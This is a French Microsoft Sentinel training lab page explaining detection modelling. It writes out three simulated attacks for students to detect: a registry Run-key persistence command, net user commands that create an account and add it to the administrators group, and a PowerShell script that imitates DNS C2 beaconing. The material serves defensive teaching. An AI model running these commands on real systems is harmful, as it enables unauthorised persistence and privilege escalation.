---
lab:
  title: "Exercice\_5\_: comprendre la modélisation de la détection"
  module: Learning Path 7 - Create detections and perform investigations using Microsoft Sentinel
---

# Chemin d’apprentissage 7 - Labo 1 - Exercice 5 - Comprendre la modélisation de la détection

![Vue d’ensemble du labo](../Media/SC-200-Lab_Diagrams_Mod7_L1_Ex5.png)
### Tâche 1 : comprendre les attaques

>**Important : vous n’effectuerez aucune action dans cet exercice.**  Ces instructions décrivent simplement les attaques que vous allez effectuer dans l’exercice suivant. Veuillez lire attentivement cette page.

Les modèles d’attaque sont basés sur un projet open source : https://github.com/redcanaryco/atomic-red-team


#### Attaque 1 : persistance avec l’ajout de la clé de Registre

Les attaquants ajoutent un programme dans la clé Exécuter le Registre. La persistance est obtenue en exécutant le programme à chaque fois que l’utilisateur se connecte.

```
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "SOC Test" /t REG_SZ /F /D "C:\temp\startup.bat"
```

#### Attaque 2 : ajout d’un utilisateur et élévation des privilèges

Les attaquants ajoutent de nouveaux utilisateurs et élèvent leurs privilèges au niveau du groupe Administrateurs. L’attaquant peut alors se connecter avec un autre compte élevé.

```
net user theusernametoadd /add
net user theusernametoadd ThePassword1!
net localgroup administrators theusernametoadd /add
```

#### Attaque 3 : DNS / C2 

L’attaquant envoie un nombre élevé de requêtes DNS à un serveur de commande et contrôle (C2). L’objectif est de déclencher une détection basée sur des seuils en fonction du nombre de requêtes DNS provenant d’un système source unique ou d’un domaine cible unique.

```
param(
    [string]$Domain = "microsoft.com",
    [string]$Subdomain = "subdomain",
    [string]$Sub2domain = "sub2domain",
    [string]$Sub3domain = "sub3domain",
    [string]$QueryType = "TXT",
        [int]$C2Interval = 8,
        [int]$C2Jitter = 20,
        [int]$RunTime = 240
)
$RunStart = Get-Date
$RunEnd = $RunStart.addminutes($RunTime)
$x2 = 1
$x3 = 1 
Do {
    $TimeNow = Get-Date
    Resolve-DnsName -type $QueryType $Subdomain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
    if ($x2 -eq 3 )
    {
        Resolve-DnsName -type $QueryType $Sub2domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
        $x2 = 1
    }
    else
    {
        $x2 = $x2 + 1
    }
    if ($x3 -eq 7 )
    {
        Resolve-DnsName -type $QueryType $Sub3domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
        $x3 = 1
    }
    else
    {
        $x3 = $x3 + 1
    }
    $Jitter = ((Get-Random -Minimum -$C2Jitter -Maximum $C2Jitter) / 100 + 1) +$C2Interval
    Start-Sleep -Seconds $Jitter
}
Until ($TimeNow -ge $RunEnd)
```


### Tâche 2 : comprendre la modélisation de la détection

Le cycle de configuration de détection d’attaque utilisé dans ce labo représente toutes les sources de données, même si vous ne vous concentrez que sur deux sources de données spécifiques.

Pour créer une détection, commencez par écrire une instruction KQL. Étant donné que vous attaquerez un hôte, vous aurez des données à son sujet pour commencer à générer l’instruction KQL.


Une fois l’instruction KQL prête, vous devez créer la règle analytique.

Le déclenchement de la règle entraîne la création d’alertes et d’incidents. Examinez-les pour déterminer si vous communiquez des champs aux analystes des opérations de sécurité pour les aider dans leur investigation.

Vous devez ensuite apporter d’autres modifications à la règle analytique.

>**Remarque :** certaines alertes sont déclenchées dans un délai plus court uniquement dans le cadre de notre labo.

## Passez à l’exercice 6
